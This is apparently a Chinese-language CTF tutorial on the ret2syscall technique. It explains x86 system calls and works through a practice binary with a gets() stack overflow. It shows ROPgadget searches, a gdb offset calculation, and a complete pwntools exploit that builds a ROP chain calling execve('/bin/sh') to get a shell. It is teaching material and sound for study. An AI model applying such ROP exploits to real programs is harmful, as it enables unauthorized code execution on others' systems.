---
title: 【PWN】ret2syscall
---

## 原理

ret2syscall 即控制程序执行系统调用来获取 shell
什么是系统调用？
- 操作系统提供给用户的编程接口
- 是提供访问操作系统所管理的底层硬件的接口
- 本质上是一些内核函数代码，以规范的方式驱动硬件
- x86 通过 int 0x80 指令进行系统调用、amd64 通过 syscall 指令进行系统调用
mov eax, 0xb
mov ebx, [“/bin/sh”] 
mov ecx, 0
mov edx, 0
int 0x80
=> execve("/bin/sh",NULL,NULL)
![1.jpg](/images/ret2syscall/1.jpg)
## 例题
链接：https://pan.baidu.com/s/19ymHlZZmVGsJHFmmlwww0w 提取码：r4el 
首先checksec 看一下保护机制

![2.jpg](/images/ret2syscall/2.jpg)

接着使用ida打开分析

![3.jpg](/images/ret2syscall/3.jpg)

gets函数存在明显的栈溢出，但是这次没有后门函数，NX防护也打开了，那么就要换一种套路了，通过系统调用拿到shell
我们需要控制eax，ebx，ecx，edx的值，可以使用ROPgadget这个工具帮我们找到所需的代码片段。
首先寻找控制 eax 的 gadgets
ROPgadget --binary ret2syscall --only 'pop|ret' | grep 'eax'

![4.jpg](/images/ret2syscall/4.jpg)

然后寻找控制ebx的
ROPgadget --binary ret2syscall --only 'pop|ret' | grep 'ebx'，其中红色框框圈出来的能让我们控制余下的寄存器，就不用再接着找了。

![5.jpg](/images/ret2syscall/5.jpg)

接着寻找程序中有没有int 80指令，ROPgadget --binary ret2syscall --only 'int'

![6.jpg](/images/ret2syscall/6.jpg)

最后我们还需要找到一个字符串/bin/sh，ROPgadget --binary ret2syscall --string '/bin/sh'

![7.jpg](/images/ret2syscall/7.jpg)

这样我们就可以构造0xb的系统调用，具体要溢出多少字节可以使用gdb动态调试获取，
gdb ret2syscall
b main（在main函数下断点）
r（让程序跑起来）
n（单步执行）
一直走到gets函数输入字符串AAAAAAAA

![8.jpg](/images/ret2syscall/8.jpg)

然后使用stack 35命令查看栈内容

![9.jpg](/images/ret2syscall/9.jpg)

b8 - 4c = 6c，再加上ebp的4个字节，总共需要填充0x70个字节到返回地址
最后成功利用的堆栈图如下

![10.jpg](/images/ret2syscall/10.png)

exp：

```python
from pwn import *

sh = process('./ret2syscall')

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_80 = 0x08049421
bin_sh = 0x080be408

payload = flat(['A' * 0x70,  pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, bin_sh, int_80])

sh.sendline(payload)

sh.interactive()
```